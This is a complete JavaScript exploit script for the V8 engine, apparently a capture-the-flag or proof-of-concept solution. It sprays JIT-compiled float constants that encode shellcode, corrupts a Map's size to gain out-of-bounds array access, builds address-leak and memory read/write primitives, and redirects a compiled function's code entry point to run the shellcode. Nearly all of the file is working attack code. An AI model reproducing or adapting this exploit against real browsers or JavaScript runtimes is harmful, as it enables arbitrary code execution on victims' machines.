const RELEASE = true;

let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}


// jit spraying
function jit() {
    return [
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112871410787e-246, // 0xceb9050636cb866
        1.9711314215434657e-246, // 0xceb906163782fb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9616425752617766e-246, // 0xceb6e69622f0548
        1.9711832695973408e-246, // 0xceb9090e7894850
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711831018987653e-246, // 0xceb9090c0314890
        1.971112653196158e-246, // 0xceb9050303ab866
        1.9710920957760286e-246, // 0xceb903d59414cb8
        1.9710610293119303e-246, // 0xceb9020e0c14890
        1.9532382542574046e-246, // 0xceb505349440548
        1.971183239760578e-246, // 0xceb9090e0894850
        1.9711128050518315e-246, // 0xceb905053db3148
        1.971182900255075e-246, // 0xceb909090e28948
        1.9710902863710406e-246, // 0xceb903bb0c03148
        -6.828527034370483e-229 // 0x909090909090050f
    ];
}
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); jit(); } // compile via turbofan


let map;
let oob_arr;
let tmp_obj = {};
let obj_arr;
let typed_arr;

(function layout() {
    map = new Map();
    map.set(1, 1); // map.size == 1
    map.set(2, 2); // map.size == 2
    map.delete(2); // map.size == 1
    map.delete([].hole()); // map.size == 0
    map.delete(1); // map.size == -1

    oob_arr = [1.1];
    let dummy = {};
    obj_arr = [tmp_obj];
    typed_arr = new Uint32Array(1);
})();

console.log(`[+] map.size == ${map.size}`); // expected: -1
console.assert(map.size == -1);

// generate oob array
map.set(21, -1); // extend hash table of `map`
map.set(0x1006, 0); // overwrite length of `oob_arr`
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`); // expected: 0x1006


// get (compressed) address of `obj` in sandbox
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[7]) >> 32n;
}

// read 4-byte from `addr` in sandbox
function read4(addr) {
    oob_arr[26] = itof((addr - 7n) << 32n); // base_pointer of `typed_arr`
    return typed_arr[0];
}

// write 4-byte `value` to `addr` in sandbox
function write4(addr, value) {
    oob_arr[26] = itof((addr - 7n) << 32n); // base_pointer of `typed_arr`
    typed_arr[0] = value;
}


let jit_addr = addrof(jit) - 1n;
console.log(`[+] jit_addr == ${hex(jit_addr)}`);

let container_addr = BigInt(read4(jit_addr + 0x18n) - 1); // CodeDataContainer
console.log(`[+] container_addr == ${hex(container_addr)}`);

let code_entry_point = BigInt(read4(container_addr + 0xcn)) + (BigInt(read4(container_addr + 0x10n)) << 32n);
console.log(`[+] code_entry_point == ${hex(code_entry_point)}`);

// overwrite code_entry_point with address of shellcode
write4(container_addr + 0xcn, Number(code_entry_point & 0xffffffffn) + (RELEASE ? 0x66 : 0x7f));

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
